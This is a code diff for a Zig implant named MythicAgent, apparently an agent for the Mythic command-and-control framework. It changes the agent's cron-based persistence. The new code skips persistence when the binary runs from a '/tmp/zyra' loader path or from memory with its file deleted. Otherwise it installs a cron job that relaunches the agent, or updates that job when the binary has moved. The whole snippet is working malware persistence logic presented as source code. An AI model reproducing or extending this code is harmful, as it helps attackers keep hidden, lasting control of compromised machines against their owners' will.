@@ -82,10 +82,37 @@ pub const MythicAgent = struct {
         const exepath = try std.fs.selfExePathAlloc(self.allocator);
         defer self.allocator.free(exepath);
 
-        PersistUtils.install_cron(exepath, self.allocator) catch |err| {
-            std.debug.print("{}", .{err});
-        };
+        //There is a bug where if you use zyra, the path is different from where
+        //the agent is. So we'll just install cron only if zyra isn't used
+        //This is a temporary workaround until I do a better persistence mechanism
+        //We also need to check if the cron entry is different if the binary
+        //was moved to a different location. If it was moved, we need to update
+        //the cron entry as well.
 
+        const is_zyra = std.mem.startsWith(u8, exepath, "/tmp/zyra");
+        const in_mem = std.mem.endsWith(u8, exepath, " (deleted)");
+
+        if (is_zyra or in_mem) {
+            print("", .{});
+        } else {
+            // Here is where we should check if a cron job exists for this exepath
+            // If it doesn't, we install one
+            const cron_exists = try PersistUtils.get_cron_entries(self.allocator);
+            if (cron_exists == null or cron_exists.?.len == 0) {
+                PersistUtils.install_cron(exepath, self.allocator) catch |err| {
+                    std.debug.print("{}", .{err});
+                };
+            } else {
+                const cron_path = cron_exists.?;
+                if (!std.mem.eql(u8, cron_path, exepath)) {
+                    PersistUtils.update_cron_entry(cron_path, exepath, self.allocator) catch |err| {
+                        std.debug.print("{}", .{err});
+                    };
+                } else {
+                    print("", .{});
+                }
+            }
+        }
         while (self.is_running) {
             if (self.config.kill_date) |kill_date| {
                 if (TimeUtils.isKillDateReached(kill_date)) {
